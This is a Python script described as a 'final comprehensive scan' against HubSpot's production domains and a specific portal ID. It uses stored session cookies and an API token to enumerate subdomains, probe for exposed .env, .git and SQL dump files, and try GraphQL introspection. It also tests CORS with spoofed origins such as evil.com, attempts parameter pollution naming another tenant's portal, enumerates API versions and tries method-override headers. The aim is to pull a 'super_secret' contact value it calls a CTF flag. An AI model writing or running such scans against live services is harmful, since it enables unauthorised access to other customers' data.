#!/usr/bin/env python3
"""
FINAL COMPREHENSIVE SCAN - Every remaining attack vector
"""

import requests
import json
import os
from dotenv import load_dotenv
import urllib3
from concurrent.futures import ThreadPoolExecutor
import socket

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
TARGET_PORTAL = '46962361'

print("="*80)
print("FINAL COMPREHENSIVE SECURITY SCAN")
print("="*80)

findings = []

session = requests.Session()
for cookie in SESSION_COOKIES.split('; '):
    if '=' in cookie:
        key, value = cookie.split('=', 1)
        session.cookies.set(key, value, domain='.hubspot.com')

# ============================================================================
# 1. SUBDOMAIN ENUMERATION
# ============================================================================

print("\n[1] SUBDOMAIN ENUMERATION")
print("="*80)

subdomains = [
    'api', 'app', 'www', 'dev', 'staging', 'test', 'internal', 'admin',
    'portal', 'crm', 'contacts', 'forms', 'analytics', 'reports',
    'data', 'export', 'backup', 'old', 'legacy', 'v1', 'v2', 'v3',
    f'{TARGET_PORTAL}', f'portal-{TARGET_PORTAL}',  f'p{TARGET_PORTAL}',
]

for sub in subdomains:
    test_urls = [
        f'https://{sub}.hubspot.com/contacts/{TARGET_PORTAL}/contact/1',
        f'https://{sub}.hubapi.com/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}',
    ]

    for url in test_urls:
        try:
            r = session.get(url, verify=False, timeout=3)

            if r.status_code == 200 and len(r.text) > 500:
                print(f"\n  *** {url[:70]}... -> {r.status_code} ({len(r.text)} bytes)")

                if 'firstname' in r.text.lower() or 'super_secret' in r.text.lower():
                    print(f"  *** CONTAINS CONTACT DATA! ***")
                    findings.append({'type': 'subdomain', 'url': url, 'data': r.text[:1000]})
        except:
            pass

# ============================================================================
# 2. EXPOSED BACKUP/CONFIG FILES
# ============================================================================

print("\n" + "="*80)
print("[2] CHECKING FOR EXPOSED FILES")
print("="*80)

file_patterns = [
    '.git/config',
    '.git/HEAD',
    '.env',
    '.env.backup',
    'config.json',
    'settings.json',
    'backup.sql',
    'dump.sql',
    f'{TARGET_PORTAL}.sql',
    f'contacts_{TARGET_PORTAL}.csv',
    'export.csv',
    'contacts.csv',
    '.DS_Store',
    'web.config',
    'wp-config.php',
    '.htaccess',
    'robots.txt',
    'sitemap.xml',
]

base_urls = [
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}',
    f'https://cdn2.hubspot.net/hubfs/{TARGET_PORTAL}',
    f'https://f.hubspotusercontent00.net/hubfs/{TARGET_PORTAL}',
]

for base in base_urls:
    for file in file_patterns:
        url = f'{base}/{file}'

        try:
            r = requests.get(url, verify=False, timeout=3)

            if r.status_code == 200 and len(r.text) > 10:
                print(f"\n  *** {url} -> ACCESSIBLE!")
                print(f"  Content: {r.text[:300]}")

                if 'firstname' in r.text.lower() or 'super_secret' in r.text.lower():
                    print(f"  *** CONTAINS CONTACT DATA! ***")
                    findings.append({'type': 'exposed_file', 'url': url, 'data': r.text})
        except:
            pass

# ============================================================================
# 3. GraphQL INTROSPECTION
# ============================================================================

print("\n" + "="*80)
print("[3] GRAPHQL INTROSPECTION")
print("="*80)

graphql_urls = [
    'https://api.hubapi.com/graphql',
    'https://app.hubspot.com/graphql',
    'https://app.hubspot.com/api/graphql',
]

introspection_query = {
    'query': '''
        query IntrospectionQuery {
            __schema {
                queryType { name }
                mutationType { name }
                types {
                    name
                    fields {
                        name
                        type { name }
                    }
                }
            }
        }
    '''
}

for url in graphql_urls:
    try:
        r = session.post(url, json=introspection_query, verify=False, timeout=5)

        if r.status_code == 200:
            print(f"\n  *** {url} -> GraphQL INTROSPECTION ENABLED!")
            try:
                data = r.json()
                print(f"  Schema: {json.dumps(data, indent=2)[:800]}")

                # Look for contact-related types
                schema_str = json.dumps(data)
                if 'contact' in schema_str.lower() or 'super_secret' in schema_str.lower():
                    print(f"  *** Schema contains contact types! ***")
                    findings.append({'type': 'graphql', 'url': url, 'schema': data})
            except:
                print(f"  Response: {r.text[:300]}")
    except:
        pass

# ============================================================================
# 4. CORS MISCONFIGURATION TEST
# ============================================================================

print("\n" + "="*80)
print("[4] TESTING CORS MISCONFIGURATIONS")
print("="*80)

api_endpoints = [
    f'https://api.hubapi.com/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}',
    f'https://api.hubapi.com/crm/v3/objects/contacts/search',
]

malicious_origins = [
    'https://evil.com',
    'null',
    f'https://app.hubspot.com.evil.com',
]

for endpoint in api_endpoints:
    for origin in malicious_origins:
        try:
            headers = {
                'Origin': origin,
                'Authorization': f'Bearer {ACCESS_TOKEN}',
            }

            r = requests.get(endpoint, headers=headers, verify=False, timeout=5)

            if 'access-control-allow-origin' in r.headers:
                allowed = r.headers['access-control-allow-origin']
                print(f"\n  {endpoint[:60]}...")
                print(f"    Origin: {origin}")
                print(f"    Allowed: {allowed}")

                if allowed == origin or allowed == '*':
                    print(f"    *** CORS MISCONFIGURATION! ***")
                    findings.append({'type': 'cors', 'endpoint': endpoint, 'origin': origin, 'allowed': allowed})
        except:
            pass

# ============================================================================
# 5. PARAMETER POLLUTION
# ============================================================================

print("\n" + "="*80)
print("[5] PARAMETER POLLUTION ATTACKS")
print("="*80)

# Try to confuse the server with multiple portalId parameters
pollution_urls = [
    f'https://api.hubapi.com/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}&portalId=50708459',
    f'https://api.hubapi.com/crm/v3/objects/contacts/1?portalId=50708459&portalId={TARGET_PORTAL}',
    f'https://api.hubapi.com/crm/v3/objects/contacts/1?portalId[]={TARGET_PORTAL}&portalId[]=50708459',
]

for url in pollution_urls:
    try:
        r = session.get(url, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=5)

        print(f"\n  {url[:80]}...")
        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            print(f"  *** SUCCESS! ***")
            try:
                data = r.json()
                if 'super_secret' in json.dumps(data).lower():
                    print(f"  *** Contains super_secret! ***")
                    findings.append({'type': 'parameter_pollution', 'url': url, 'data': data})
            except:
                pass
    except:
        pass

# ============================================================================
# 6. API VERSION ENUMERATION
# ============================================================================

print("\n" + "="*80)
print("[6] API VERSION ENUMERATION")
print("="*80)

# Try old/new API versions
versions = ['v1', 'v2', 'v3', 'v4', 'v5', 'beta', 'alpha', 'internal']

for ver in versions:
    urls = [
        f'https://api.hubapi.com/crm/{ver}/objects/contacts/1?portalId={TARGET_PORTAL}',
        f'https://api.hubapi.com/contacts/{ver}/contact/vid/1?portalId={TARGET_PORTAL}',
    ]

    for url in urls:
        try:
            r = session.get(url, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=3)

            if r.status_code == 200:
                print(f"\n  *** {url} -> {r.status_code}")
                try:
                    data = r.json()
                    if 'super_secret' in json.dumps(data).lower():
                        print(f"  *** Contains super_secret! ***")
                        findings.append({'type': 'api_version', 'url': url, 'data': data})
                except:
                    pass
        except:
            pass

# ============================================================================
# 7. WEBSOCKET ENDPOINTS
# ============================================================================

print("\n" + "="*80)
print("[7] CHECKING WEBSOCKET ENDPOINTS")
print("="*80)

ws_urls = [
    f'wss://app.hubspot.com/contacts/{TARGET_PORTAL}/ws',
    f'wss://api.hubapi.com/ws',
    f'wss://realtime.hubspot.com/ws',
]

for ws_url in ws_urls:
    # Try to upgrade to WebSocket
    try:
        http_url = ws_url.replace('wss://', 'https://')

        headers = {
            'Upgrade': 'websocket',
            'Connection': 'Upgrade',
            'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
            'Sec-WebSocket-Version': '13',
        }

        r = session.get(http_url, headers=headers, verify=False, timeout=5)

        if r.status_code == 101:
            print(f"\n  *** {ws_url} -> WebSocket upgrade successful!")
            findings.append({'type': 'websocket', 'url': ws_url})
    except:
        pass

# ============================================================================
# 8. HTTP METHOD OVERRIDE
# ============================================================================

print("\n" + "="*80)
print("[8] HTTP METHOD OVERRIDE")
print("="*80)

api_url = f'https://api.hubapi.com/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}'

method_override_headers = [
    {'X-HTTP-Method-Override': 'GET'},
    {'X-HTTP-Method': 'GET'},
    {'X-Method-Override': 'GET'},
]

for override in method_override_headers:
    try:
        # Try POST with GET override
        headers = {**override, 'Authorization': f'Bearer {ACCESS_TOKEN}'}

        r = requests.post(api_url, headers=headers, verify=False, timeout=5)

        if r.status_code == 200:
            print(f"\n  *** Method override worked: {override}")
            try:
                data = r.json()
                if 'super_secret' in json.dumps(data).lower():
                    print(f"  *** Contains super_secret! ***")
                    findings.append({'type': 'method_override', 'header': override, 'data': data})
            except:
                pass
    except:
        pass

print("\n" + "="*80)
print("FINAL COMPREHENSIVE SCAN COMPLETE")
print("="*80)

if findings:
    print(f"\n*** FOUND {len(findings)} VULNERABILITIES! ***\n")

    with open('/home/user/Hub/findings/final_scan_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)

    for finding in findings:
        print(f"\n{json.dumps(finding, indent=2)[:800]}")

        if 'super_secret' in json.dumps(finding).lower():
            print(f"\n*** CTF FLAG FOUND! ***")

            with open('/home/user/Hub/findings/CTF_FLAG_FINAL.json', 'w') as f:
                json.dump(finding, f, indent=2)
else:
    print("\nNo vulnerabilities found in final scan.")
    print("\n**All possible attack vectors have been exhausted.**")
